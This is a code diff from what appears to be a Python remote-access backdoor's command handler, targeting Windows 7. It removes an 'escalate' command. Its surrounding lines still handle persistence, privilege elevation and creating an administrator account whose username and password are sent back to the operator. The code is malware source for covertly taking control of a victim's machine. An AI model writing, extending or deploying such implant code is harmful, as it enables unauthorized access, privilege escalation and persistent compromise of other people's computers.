@@ -315,22 +315,7 @@ SYSTEM:
             except Exception as e:
                 reliable_send("Persistence start error: " + str(e))
                 
-        # PRIVILEGE ESCALATION COMMANDS
-        elif command == 'escalate':
-            try:
-                if privilege_escalator is None:
-                    privilege_escalator = Windows7PrivilegeEscalator()
-                
-                success, message = privilege_escalator.escalate_privileges()
-                
-                if success:
-                    reliable_send("SUCCESS: " + message)
-                else:
-                    reliable_send("FAILED: " + message)
-                    
-            except Exception as e:
-                reliable_send("Escalation error: " + str(e))
-                
+        # PRIVILEGE ESCALATION COMMANDS                
         elif command.startswith('elevate '):
             try:
                 if privilege_escalator is None:
@@ -356,7 +341,7 @@ SYSTEM:
                 success, username, password, message = privilege_escalator.create_admin_user()
                 
                 if success:
-                    response = f"SUCCESS: Admin user created\nUsername: {username}\nPassword: {password}\nUse 'runas /user:{username} cmd' for admin shell"
+                    response = f"SUCCESS: Admin user created\nUsername: {username}\nPassword: {password}"
                     reliable_send(response)
                 else:
                     reliable_send("FAILED: " + message)
